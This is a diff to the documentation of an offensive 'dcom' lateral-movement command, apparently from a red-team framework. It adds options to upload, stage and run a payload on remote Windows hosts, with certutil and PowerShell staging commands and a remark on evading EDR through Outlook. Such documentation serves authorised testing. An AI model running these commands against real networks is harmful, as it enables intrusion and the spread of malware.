@@ -7,7 +7,7 @@ hidden = false
 
 ## Summary
 
-Execute commands on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Six DCOM objects supported: MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application, and Outlook.Application.
+Execute commands, upload files, or stage-and-execute on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Six DCOM objects supported: MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application, and Outlook.Application. File staging uses certutil or PowerShell encoding for transfer.
 
 {{% notice info %}}Windows Only{{% /notice %}}
 
@@ -15,7 +15,7 @@ Execute commands on remote hosts via DCOM (Distributed Component Object Model) l
 
 | Argument | Required | Default | Description |
 |----------|----------|---------|-------------|
-| action | Yes | exec | Action: `exec` |
+| action | Yes | exec | Action: `exec`, `upload`, or `exec-staged` |
 | host | Yes | - | Target hostname or IP address |
 | object | No | mmc20 | DCOM object: `mmc20`, `shellwindows`, `shellbrowser`, `wscript`, `excel`, `outlook` |
 | command | Yes | - | Command or program to execute |
@@ -24,6 +24,10 @@ Execute commands on remote hosts via DCOM (Distributed Component Object Model) l
 | username | No | - | Username for DCOM auth (uses make-token creds if not specified) |
 | password | No | - | Password for DCOM auth (uses make-token creds if not specified) |
 | domain | No | - | Domain for DCOM auth (uses make-token creds if not specified) |
+| local_path | No | - | Local file path to upload (required for `upload` and `exec-staged`) |
+| remote_path | No | C:\Windows\Temp\<random>.exe | Destination path on the target |
+| method | No | certutil | Staging method: `certutil` (chunked base64) or `powershell` (single command, <150KB) |
+| cleanup | No | true | Remove staged file after execution (`exec-staged` only) |
 
 ## Usage
 
@@ -82,6 +86,24 @@ dcom -action exec -host 192.168.1.50 -object outlook -command "cmd.exe" -args "/
 ```
 Uses `Outlook.Application.CreateObject("Wscript.Shell").Run`. Command executes inside `OUTLOOK.EXE` process context. Unusual vector — EDR tools typically don't monitor Outlook for shell execution. Requires Outlook installed on target. May be blocked by Outlook's programmatic access security settings.
 
+### Upload a File to Remote Host
+```
+dcom -action upload -host 192.168.1.50 -local_path "C:\Users\Public\payload.exe" -remote_path "C:\Windows\Temp\svc.exe" -method certutil
+```
+Stages a file on the remote host using certutil base64 encoding via DCOM command execution.
+
+### Stage and Execute (Upload + Run + Cleanup)
+```
+dcom -action exec-staged -host 192.168.1.50 -local_path "C:\Users\Public\payload.exe" -cleanup true
+```
+Uploads the file, executes it, and removes it from the target. Auto-generates a random filename in `C:\Windows\Temp\` if `-remote_path` is not specified.
+
+### Stage and Execute via PowerShell
+```
+dcom -action exec-staged -host 192.168.1.50 -local_path "C:\Users\Public\small.exe" -method powershell
+```
+Uses PowerShell `[IO.File]::WriteAllBytes` for files under 150KB. Single command — faster but limited by command line length.
+
 ## Example Output
 
 ### Successful Execution
@@ -130,3 +152,4 @@ Failed to create MMC20.Application on 192.168.1.50: CoCreateInstanceEx failed: H
 ## MITRE ATT&CK Mapping
 
 - **T1021.003** — Remote Services: Distributed Component Object Model
+- **T1570** — Lateral Tool Transfer
